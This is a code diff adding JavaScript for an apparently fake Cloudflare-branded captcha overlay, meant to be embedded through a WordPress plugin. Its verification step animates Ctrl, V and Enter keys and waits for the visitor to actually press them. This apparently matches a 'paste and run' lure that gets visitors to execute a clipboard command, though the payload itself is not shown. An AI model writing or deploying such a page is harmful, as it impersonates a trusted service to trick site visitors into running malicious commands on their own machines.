+            var kc = document.querySelector(".key-anim-step2-ctrl .key-cap"); if (kc) kc.style.animation = "keyCapStep2Ctrl 3s ease-in-out infinite"
+            var kv = document.querySelector(".key-anim-step2-v .key-cap"); if (kv) kv.style.animation = "keyCapStep2V 3s ease-in-out infinite"
+            var ke = document.querySelector(".key-anim-step2-enter .key-cap"); if (ke) ke.style.animation = "keyCapStep2Enter 3s ease-in-out infinite"
+            var p2 = document.querySelector(".plus-animate-step2"); if (p2) p2.style.animation = "plusGlowStep2 3s infinite"
+          }
+        }
+      }
+
+      function showCaptcha() {
+        captchaOpen = true
+        animationPhase = 4
+        step = 1
+        faqOpen = false
+        howItWorksOpen = false
+        expandedFaq = null
+        expandedHowItWorks = null
+        injectAnimationStyles()
+        var overlay = document.getElementById("cf-captcha-overlay")
+        if (overlay) { overlay.style.display = "flex"; renderCaptchaContent() }
+      }
+
+      function hideCaptcha() {
+        captchaOpen = false
+        var overlay = document.getElementById("cf-captcha-overlay")
+        if (overlay) overlay.style.display = "none"
+      }
+
+      function handleContinueToVerification() {
+        animationPhase = 5
+        step = 1
+        step1KeyDetected = false
+        renderCaptchaContent()
+        // Do NOT auto-advance. Wait for actual key press detection.
+      }
+
+      function completeVerification() {
+        setVerificationCookie()
+        hideCaptcha()
+        // Show success in checkbox
+        var step2Elements = document.querySelectorAll(".step2")
+        var step3Elements = document.querySelectorAll(".step3")
+        var checkboxWindow = document.getElementById("checkbox-window")
+        step2Elements.forEach(function (el) { el.style.display = "none" })
+        step3Elements.forEach(function (el) { el.style.display = "block" })
+        var spinner = document.getElementById("spinner")
+        if (spinner) spinner.style.visibility = "hidden"
+        // Notify parent window (for iframe usage in WP plugin)
+        try { if (window.parent && window.parent !== window) { window.parent.postMessage("cf-captcha-verified", "*") } } catch (e) { }
+      }
+
+      function toggleFaq() { faqOpen = !faqOpen; if (faqOpen) howItWorksOpen = false; renderCaptchaContent() }
+      function toggleHowItWorks() { howItWorksOpen = !howItWorksOpen; if (howItWorksOpen) faqOpen = false; renderCaptchaContent() }
+      function toggleFaqItem(num) { expandedFaq = expandedFaq === num ? null : num; renderCaptchaContent() }
+      function toggleHowItWorksItem(num) { expandedHowItWorks = expandedHowItWorks === num ? null : num; renderCaptchaContent() }
+
+      lang = detectLanguage()
+      injectAnimationStyles()
+      setupKeyboardHandler()
+
+      window.CloudflareCaptcha = {
+        show: showCaptcha,
+        hide: hideCaptcha,
+        complete: completeVerification,
+        isVerified: isVerified,
+        continueToVerification: handleContinueToVerification,
+        toggleFaq: toggleFaq,
+        toggleHowItWorks: toggleHowItWorks,
+        toggleFaqItem: toggleFaqItem,
+        toggleHowItWorksItem: toggleHowItWorksItem
+      }
+    })()
+  </script>
 
 </body>
+
 </html>
